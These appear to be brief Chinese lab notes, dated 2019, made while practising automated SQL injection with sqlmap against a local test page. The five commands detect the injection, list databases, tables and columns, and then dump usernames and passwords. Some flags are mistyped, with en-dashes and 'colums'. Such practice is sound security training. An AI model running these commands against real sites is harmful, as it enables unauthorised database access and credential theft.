2019/07/21实验笔记

使用sqlmap实现自动注入攻击

1、检测是否存在SQL注入

Sqlmap.py -u 127.0.0.1/sql/sql/union.php?id=1

2、爆库

Sqlmap.py -u 127.0.0.1/sql/sql/union.php?id=1 –dbs

3、爆表

Sqlmap.py -u 127.0.0.1/sql/sql/union.php?id=1 -D test –tables

4、爆字段

Sqlmap.py -u 127.0.0.1/sql/sql/union.php?id=1 -D test -T user –colums

5、爆数据

Sqlmap.py -u 127.0.0.1/sql/sql/union.php?id=1 -D test -T user -C id,password,username –dump
